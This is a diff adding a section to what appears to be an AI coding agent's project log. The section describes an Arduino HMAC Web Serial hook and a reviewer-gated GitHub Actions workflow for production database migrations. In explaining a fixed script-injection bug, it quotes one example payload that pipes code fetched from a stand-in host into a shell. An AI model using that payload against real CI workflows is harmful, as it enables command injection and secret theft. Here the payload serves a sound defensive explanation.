@@ -3241,6 +3241,120 @@ note above was stale and has been corrected) with Gitleaks and Semgrep.
   convention, unchanged) after the crypto edits, confirming they didn't
   regress anything.
 
+## 3aa. Hardware Key Attestation & a Real Production Migration Gate (ad hoc)
+
+Explicit user request: a Web Serial hook talking to an Arduino that
+signs a challenge, plus wiring that into "a mandatory gatekeeper for
+executing high-privilege Prisma database migrations." The third part as
+literally described didn't hold up and was flagged before building
+anything for it, not built uncritically — see below for why, and what
+was built instead once the user picked a direction.
+
+- **Why the literal ask was flagged, not built**: this app has no
+  "frontend" code path that executes a migration at all — `prisma
+  migrate deploy` only ever runs via `npm run db:migrate:deploy` from a
+  terminal or `ci.yml` (§3z), never from anything a browser reaches.
+  Building one now would mean inventing a brand-new, standing,
+  extremely-high-blast-radius HTTP endpoint whose job is "run pending
+  schema DDL against production" — and gating *that* behind Web Serial
+  specifically doesn't add real security over just protecting the route
+  with a strong secret: verified client-side, the check is fully
+  bypassable (the JS is readable; call the underlying route directly and
+  skip the browser and the hardware entirely); verified server-side (the
+  only correct way), the Arduino contributes nothing beyond "does the
+  requester hold this HMAC key" while adding a real new failure mode —
+  production migrations now depend on one physical USB dongle being
+  plugged into one specific laptop; lose it, and nobody can ever migrate
+  again. Presented three options; the user picked the real fix: leave
+  migrations in CI/CD, add a proper approval gate there, no hardware
+  involved in gating the database at all.
+- **`src/lib/hooks/use-arduino-serial.ts`** (new, client-only,
+  `"use client"`): a transport-only Web Serial hook — feature-detects
+  `navigator.serial`, exposes `connect()`/`disconnect()`/`sendChallenge()`
+  and a `status` state machine (`unsupported`/`idle`/`connecting`/
+  `connected`/`signing`/`error`). Deliberately does zero verification of
+  what comes back — its doc comment says so explicitly, matching this
+  app's established "tools/transports fetch data, they never judge it"
+  posture (AGENTS.md §1 law #6 applied to a new kind of transport). A
+  previously-authorized port reopens automatically on mount via
+  `navigator.serial.getPorts()` (no new user gesture needed for an
+  already-granted port — only `requestPort()` needs one); reading a
+  fixed-length response accumulates chunks with an explicit timeout that
+  calls `reader.cancel()` rather than letting a stalled device hang the
+  UI forever, and the port is closed on unmount — the same cleanup
+  discipline this app's WebGL context (§3f) and Web Workers (§3y)
+  already hold themselves to.
+- **`src/types/web-serial.d.ts`** (new): a minimal hand-written ambient
+  declaration for the Web Serial API — it isn't in TypeScript's built-in
+  DOM lib and no `@types` package exists for it; covers exactly the
+  surface the hook uses, not the full spec.
+- **`arduino/pfw-hardware-key/`** (new — a non-Next.js component
+  alongside `sidecar/`, same "separate part of this repo" precedent):
+  a `.ino` sketch using the `Crypto` library by Rhys Weatherley
+  (`SHA256`'s `resetHMAC`/`finalizeHMAC`) rather than hand-rolling
+  SHA-256 — the same "audited library over hand-rolled crypto" call this
+  app already made for its client-side Shamir implementation (§3x).
+  Protocol: 32 raw bytes in (a fresh nonce — reuse would allow replay),
+  32 raw bytes out (`HMAC-SHA256(key, challenge)`), no framing. **Not
+  independently verified against real hardware** — no Arduino toolchain
+  or device exists in this session's environment, stated plainly in both
+  the sketch and its README rather than claimed as tested, a real
+  departure from this project's usual "verified live" bar. The
+  placeholder `HMAC_KEY` is deliberately sequential bytes
+  (`0x00, 0x01, 0x02...`) rather than random-looking ones — both an
+  obvious-to-a-human placeholder marker and, confirmed by an actual
+  Gitleaks run against it, not high-entropy enough to false-positive a
+  secret scanner the way a real key would (and should) trip one.
+- **The actual migration gate: `.github/workflows/deploy-migrations.yml`**
+  (new) — `workflow_dispatch`-only (no `push`/`pull_request` trigger at
+  all, unlike `ci.yml`), with `environment: production` on the job. That
+  Environment key is the real control: GitHub can be configured
+  (Settings → Environments → "production" → Required reviewers — a
+  one-time manual step, not expressible in this YAML, not done by this
+  session against the live repo without being asked) to withhold the
+  job's start, and the environment-scoped `PRODUCTION_DATABASE_URL`
+  secret specifically, until a required reviewer approves that exact
+  run. A repository-level secret would NOT get this protection — only an
+  environment-scoped one does, which is the detail that actually makes
+  this a real gate rather than a YAML file that merely looks like one.
+  A `confirm` text input (must equal `"deploy"`) is a light extra guard
+  against an approved-but-misclicked run; a `prisma migrate status` step
+  logs what's about to change before `migrate deploy` applies it, so the
+  reviewer's approval and the audit trail both have something concrete
+  to point at.
+  - **A real, verified bug in the first draft, caught by Semgrep before
+    ever running**: `Check confirmation input` originally interpolated
+    `${{ github.event.inputs.confirm }}` directly into the `run:` shell
+    script. That splices attacker-controlled text into the script's
+    source before the shell ever parses it — a crafted input (e.g.
+    containing `"; curl evil | sh #`) could inject arbitrary commands
+    into a runner that's about to hold `PRODUCTION_DATABASE_URL`, the
+    exact "script injection via untrusted `github` context" class that's
+    among the most common real-world GitHub Actions vulnerabilities.
+    Fixed by passing the value through `env:` instead and referencing it
+    as `"$CONFIRM_INPUT"` — semgrep's
+    `yaml.github-actions.security.run-shell-injection` rule flagged the
+    original and confirmed clean after the fix, both runs against the
+    real file via the pinned `semgrep/semgrep:1.174.0` container, not
+    assumed fixed by pattern-matching the advice.
+- **Verified, not just written**: `npm run typecheck`/`lint` clean on the
+  new hook and ambient types; `npm run check` clean (845/845 passing,
+  104 skip, unchanged) after every addition in this pass. Both
+  `deploy-migrations.yml` and the hardware-key files were scanned with
+  the same pinned Gitleaks (`v8.30.1`) and Semgrep (`1.174.0`) commands
+  §3z wired into CI, run locally against the real working tree before
+  anything was committed — 0 findings after the shell-injection fix
+  above.
+- **Not done in this pass, left for the user**: creating the GitHub
+  "production" Environment itself, adding required reviewers to it, and
+  populating its `PRODUCTION_DATABASE_URL` secret are real repo-
+  governance changes against the live repository — offered, not done
+  automatically, the same "confirm before an action that affects shared
+  state" treatment every other repo-settings-level change in this
+  session got. Flashing the Arduino sketch to real hardware and
+  confirming the challenge/response round-trip is the other open item —
+  this pass built and locally verified everything short of that.
+
 ## 4. Design system (Phase 0)
 
 - **Tokens** (`src/app/globals.css`, light/dark each authored explicitly,
